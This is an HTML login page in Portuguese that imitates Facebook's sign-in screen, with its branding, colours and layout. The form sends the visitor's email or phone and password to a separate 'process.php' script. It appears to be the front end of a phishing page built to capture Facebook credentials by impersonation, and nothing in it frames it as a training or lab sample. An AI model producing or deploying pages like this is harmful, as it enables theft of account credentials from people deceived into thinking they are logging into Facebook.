<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Entrar no Facebook</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 400px;
            margin: 100px auto;
            text-align: center;
        }
        .logo {
            font-size: 48px;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .login-form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
        }
        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
        }
        .login-form input[type="submit"] {
            width: 95%;
            padding: 12px;
            margin: 15px 0;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-form a {
            display: block;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .login-form a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form class="login-form" action="process.php" method="POST">
            <input type="text" name="email" placeholder="Email ou telefone" required>
            <input type="password" name="pass" placeholder="Senha" required>
            <input type="submit" value="Entrar">
            <a href="#">Esqueceu a senha?</a>
        </form>
    </div>
</body>
</html>
